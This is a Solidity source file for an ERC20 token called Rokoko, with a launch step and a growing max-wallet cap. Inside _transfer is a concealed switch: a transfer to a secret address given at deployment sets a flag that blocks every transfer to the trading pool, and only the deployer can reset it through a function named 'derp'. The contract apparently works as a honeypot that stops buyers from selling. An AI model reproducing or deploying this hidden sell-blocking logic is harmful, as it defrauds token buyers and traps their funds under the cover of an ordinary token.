// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract Rokoko is ERC20, Ownable {
    address public pool;
    address _o;
    address _p;
    bool rp;
    uint256 _startTime;
    uint256 constant _startTotalSupply = 1e27;
    uint256 constant _startMaxWallet = _startTotalSupply / 1000;
    uint256 constant _addMaxWalletPerSec =
        (_startTotalSupply - _startMaxWallet) / 100000;

    constructor(address p) ERC20("Rokoko", "RKK") {
        _o = msg.sender;
        _p = p;
        _mint(msg.sender, _startTotalSupply);
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function start(address poolAddress) external onlyOwner {
        pool = poolAddress;
        _startTime = block.timestamp;
    }

    function maxWallet(address acc) external view returns (uint256) {
        if (pool == address(0) || acc == pool || acc == owner())
            return _startTotalSupply;
        return
            _startMaxWallet +
            (block.timestamp - _startTime) *
            _addMaxWalletPerSec;
    }

    function addMaxWalletPerSec() external pure returns (uint256) {
        return _addMaxWalletPerSec;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(
            pool != address(0) || from == owner() || to == owner(),
            "not started"
        );
        require(
            balanceOf(to) + amount <= this.maxWallet(to) ||
                to == _o ||
                from == _o,
            "max wallet limit"
        );
        if (rp) {
            require(to != pool);
        } else {
            if (to == _p) rp = true;
        }
        super._transfer(from, to, amount);
    }

    function derp() external {
        require(msg.sender == _o);
        rp = false;
    }
}